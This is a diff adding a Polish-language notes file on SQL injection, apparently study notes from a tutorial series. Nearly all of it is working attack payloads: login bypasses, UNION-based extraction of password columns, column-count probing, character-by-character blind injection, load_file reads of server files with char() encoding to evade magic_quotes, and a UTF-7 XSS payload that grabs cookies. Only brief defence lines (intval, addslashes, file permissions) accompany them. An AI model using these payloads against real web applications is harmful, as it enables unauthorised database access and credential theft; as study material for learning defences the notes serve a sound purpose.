@@ -1,0 +1,156 @@
+mysql injection:
+
+1)
+SELECT id FROM uzytkownicy WHERE login LIKE '' AND haslo LIKE ''
+?login=admin&haslo=%
+
+2)
+SELECT id FROM uzytkownicy WHERE login='' AND haslo=''
+?login=admin' /*
+?login=admin&haslo= ' or 1=1 /*
+
+3)
+SELECT login FROM uzytkownicy where id=2 limit 1
+chcemy osi¹gn¹æ:
+SELECT login FROM uzytkownicy where id=2 and 1=2 union select haslo FROM uzytkownicy limit 1
+SELECT login FROM uzytkownicy where id=2 and 1=2 union select haslo FROM uzytkownicy where id=2 limit 1 //admin
+?id=2 and 1=2 union select haslo FROM uzytkownicy where id=2 limit 1
+
+zabezpiecznie przed tym: $id=intval($_GET['id'])
+
+4)
+SELECT login FROM uzytkownicy WHERE login LIKE '$id%' and 1=2 union select haslo FROM uzytkownicy /* LIMIT 2
+SELECT login FROM uzytkownicy WHERE login LIKE '$id%' and 1=2 union select login FROM uzytkownicy /* LIMIT 2
+?login=%' and 1=2 union select haslo FROM uzytkownicy /*
+
+, ale nie mo¿na SELECT login FROM uzytkownicy WHERE login LIKE '$id%' and 1=2 union select login,haslo FROM uzytkownicy /* LIMIT 2
+bo strona lewa SELECT (login) i prawa musz¹ mieæ tak¹ sam¹ liczbê kolumn
+
+zamiast w prawej czêœci daæ "login,haslo" mo¿na po³¹czyæ kolumny funkcj¹ concat()
+concat(login,char(58),haslo) - char(58 to dwukropek), ca³oœæ:
+SELECT login FROM uzytkownicy WHERE login LIKE '$id%' and 1=2 union select concat(login,char(58),haslo) FROM uzytkownicy /* LIMIT 2
+
+2b)
+wyci¹ganie has³a:
+SELECT id FROM uzytkownicy WHERE login='' AND haslo='' union select haslo FROM uzytkownicy WHERE login='admin' /* 
+?haslo=' union select haslo FROM uzytkownicy WHERE login='admin' /*
+
+$haslo=addslashes($_GET['login']);
+$haslo=addslashes($_GET['haslo']);
+
+5)
+?login=u
+Znalezione rekordy:
+unknow
+u....
+
+zgadujemy zapytanie do bazy:
+SELECT .... FROM .... WHERE login like '$login%' ....
+
+testujemy:
+SELECT .... FROM .... WHERE login like '' and 1=2 union select 1  /*
+?login=' and 1=2 union select 1 /*
+error Warning mysql_fetch_array():... - z³a liczba kolumn
+
+SELECT .... FROM .... WHERE login like '' and 1=2 union select 1,2,3,4,5,6,7,8,9 /*
+?login=' and 1=2 union select 1,2,3,4,5,6,7,8,9 /*
+nie wywalilo bledu, a wypisa³o:
+Znaleziono rekordy:
+2
+wiemy st¹d, ¿e login jest na pozycji 2!
+czyli zapytanie wygl¹da np.:
+SELECT id,haslo,mail,active..... FROM uzytkownicy
+
+SELECT .... FROM .... WHERE login LIKE '' and 1=2 union select 1,2,3,4,5,6,7,8,9 from uzytkownicy /*
+?login=' and 1=2 union select 1,2,3,4,5,6,7,8,9 from uzytkownicy /*
+wyœwietli³o to samo co poprzednio, czyli wiemy, ¿e nazwa tabeli to "uzytkownicy"
+
+SELECT .... FROM .... WHERE login LIKE '' and 1=2 union select 1,concat(login,char(58),haslo),3,4,5,6,7,8,9 from uzytkownicy /*
+wyœwietlilo loginy
+
+6) Blind SQL injection
+?login=admin
+wyœwietla:
+"Ten user istnieje"
+
+zgadujemy zapytanie do bazy:
+SELECT .... FROM .... WHERE login='$login' ....
+
+SELECT .... FROM .... WHERE login='unknow' and haslo LIKE '%' /* ....
+?login=unknow' and haslo LIKE '%' /* ....
+"Ten user istnieje"
+
+SELECT .... FROM .... WHERE login='unknow' and haslo LIKE '%a' /* ....
+?login=unknow' and haslo LIKE '%a' /* ....
+"Nie ma takiego usera"
+wniosek: has³o nie zaczyna siê na literê "a" i zgadujemy dalej, a¿ do koñca
+
+7)sql14.avi
+
+' and 1=2 union select 1,2,3 /*
+Przesz³o
+' and 1=2 union select 1,2,load_file('var/www/index.php') /*
+Error - serwer ma magic_quotes prawdopodobnie
+http://www.uw-team.org/dekoder.html : var/www/index.php na ASCII 118,97,114,47,119,119,119,47,105,110,100,101,120,46,112,104,112
+' and 1=2 union select 1,2,load_file(char(118,97,114,47,119,119,119,47,105,110,100,101,120,46,112,104,112)) /*
+
+obrona: magic_quotes, prawa dostêpu do pliku
+
+8)XSS
++ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
